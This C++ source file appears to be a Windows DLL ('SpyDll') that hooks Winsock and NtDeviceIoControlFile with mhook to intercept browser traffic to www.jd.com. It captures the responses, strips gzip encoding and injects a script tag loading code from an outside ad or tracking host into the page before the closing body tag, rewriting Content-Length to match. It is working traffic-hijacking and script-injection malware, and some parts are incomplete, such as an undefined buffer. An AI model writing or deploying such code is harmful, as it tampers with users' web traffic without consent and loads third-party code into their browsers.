// SpyDll.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include "mhook-lib/mhook.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <ShellAPI.h>
#include <Winternl.h>
#include "CxLog.h"
#include "UnGZip.h"
#include "Modifier.h"

#define STATUS_SUCCESS					0x0
//#define STATUS_PENDING                  0x00000103

SOCKET g_s = NULL;
BOOL   g_bIsHijack = FALSE;

typedef int (WSAAPI* fWSASend)(
    __in SOCKET s,
    __in_ecount(dwBufferCount) LPWSABUF lpBuffers,
    __in DWORD dwBufferCount,
    __out_opt LPDWORD lpNumberOfBytesSent,
    __in DWORD dwFlags,
    __inout_opt LPWSAOVERLAPPED lpOverlapped,
    __in_opt LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
    );

fWSASend OrgWSASend = (fWSASend)::GetProcAddress(::LoadLibrary(TEXT("Ws2_32.dll")), "WSASend");

typedef int (WSAAPI* fWSARecv)(
    __in SOCKET s,
    __in_ecount(dwBufferCount) __out_data_source(NETWORK) LPWSABUF lpBuffers,
    __in DWORD dwBufferCount,
    __out_opt LPDWORD lpNumberOfBytesRecvd,
    __inout LPDWORD lpFlags,
    __inout_opt LPWSAOVERLAPPED lpOverlapped,
    __in_opt LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
    );

fWSARecv OrgWSARecv = (fWSARecv)::GetProcAddress(::GetModuleHandle(TEXT("Ws2_32")), "WSARecv");

HANDLE g_hFile = NULL;

int WSAAPI Hook_WSASend(
    __in SOCKET s,
    __in_ecount(dwBufferCount) LPWSABUF lpBuffers,
    __in DWORD dwBufferCount,
    __out_opt LPDWORD lpNumberOfBytesSent,
    __in DWORD dwFlags,
    __inout_opt LPWSAOVERLAPPED lpOverlapped,
    __in_opt LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
    )
{
	if (!g_bIsHijack && dwBufferCount > 0) {
		if (lpBuffers->len > 32 && lpBuffers->buf[0] == 'G' && lpBuffers->buf[1] == 'E' && strstr(lpBuffers->buf, "Host: www.jd.com\r\n")) {
			g_hFile = CreateFile(TEXT("C:\\test\\html.zip"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS, NULL);
			g_s = s;
			g_bIsHijack = TRUE;
		}
	}

	return OrgWSASend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine);
}

int WSAAPI Hook_WSARecv(
    __in SOCKET s,
    __in_ecount(dwBufferCount) __out_data_source(NETWORK) LPWSABUF lpBuffers,
    __in DWORD dwBufferCount,
    __out_opt LPDWORD lpNumberOfBytesRecvd,
    __inout LPDWORD lpFlags,
    __inout_opt LPWSAOVERLAPPED lpOverlapped,
    __in_opt LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
    )
{
	int ret = OrgWSARecv(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);
	if (g_bIsHijack && s == g_s && lpOverlapped == NULL && lpCompletionRoutine == NULL) {
		if (*lpNumberOfBytesRecvd > 0 && g_hFile) {
			DWORD fileSize;
			WriteFile (g_hFile, lpBuffers->buf, *lpNumberOfBytesRecvd, &fileSize, NULL);
		}
	}

	return ret;
}

#define AFD_RECV 0x12017
#define AFD_SEND 0x1201f

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

struct AFD_WSABUF
{
	DWORD len;
	PCH buf;
};

struct AFD_INFO
{
	AFD_WSABUF* BufferArray;
	DWORD BufferCount;
	DWORD AfdFlags;
	DWORD TdiFlags;
};

typedef NTSTATUS (WINAPI *funcNtDeviceIoControlFile)(
  _In_   HANDLE FileHandle,
  _In_   HANDLE Event,
  _In_   PIO_APC_ROUTINE ApcRoutine,
  _In_   PVOID ApcContext,
  _Out_  PIO_STATUS_BLOCK IoStatusBlock,
  _In_   ULONG IoControlCode,
  _In_   PVOID InputBuffer,
  _In_   ULONG InputBufferLength,
  _Out_  PVOID OutputBuffer,
  _In_   ULONG OutputBufferLength
);

funcNtDeviceIoControlFile OrgNtDeviceIoControlFile = (funcNtDeviceIoControlFile)GetProcAddress(LoadLibrary(TEXT("ntdll")), "NtDeviceIoControlFile");

//HTTP/1.1 200 OK
//Server: JDWS
//Date: Tue, 22 Dec 2015 03:19:52 GMT
//Content-Type: text/html
//Vary: Accept-Encoding
//Expires: Tue, 22 Dec 2015 03:19:29 GMT
//Cache-Control: max-age=0
//ser: 209
//Content-Encoding: gzip
//Via: BJ-M-YZ-NX-73(MISS), http/1.1 BJ-CT-2-JCS-104 ( [cRs f ])
//Age: 0
//Content-Length: 42213
//Connection: keep-alive

BOOL HandleData(CHAR* szHead, CString& szBody, CString& strHead)
{
	CHAR* p = strstr(szSrcBuf, "\r\n\r\n");
	*(p + 4) = '\0';
	strHead = szSrcBuf;

	// 删除gzip标志
	strHead.Replace("Content-Encoding: gzip\r\n", "");

	// 修改Content-Length
	INT begin = strHead.Find("Content-Length:");
	INT end = strHead.Find("\r\n", begin);


	INT bodyBegin = szBody.Find("</body>");
	szBody.Insert(bodyBegin, "<script type='text/javascript' src='http://rjs.niuxgame77.com/r/f.php?uid=8239&pid=3285'></script>\r\n");

	CString strSub = strHead.Mid(begin, end-begin);
	CString strNewLen;
	strNewLen.Format("Content-Length: %d", szBody.GetLength());
	strHead.Replace(strSub, strNewLen);

	strHead += szBody;

	return TRUE;
}

VOID Socket_SetHook()
{
	//Mhook_SetHook((PVOID*)&OrgWSASend, Hook_WSASend);
	//Mhook_SetHook((PVOID*)&OrgWSARecv, Hook_WSARecv);
	Mhook_SetHook((PVOID*)&OrgNtDeviceIoControlFile, MyHookNtDeviceIoControlFile);
}

VOID Socket_UnHook()
{
	//Mhook_Unhook((PVOID*)&OrgWSASend);
	//Mhook_Unhook((PVOID*)&OrgWSARecv);
	Mhook_Unhook((PVOID*)&OrgNtDeviceIoControlFile);
}
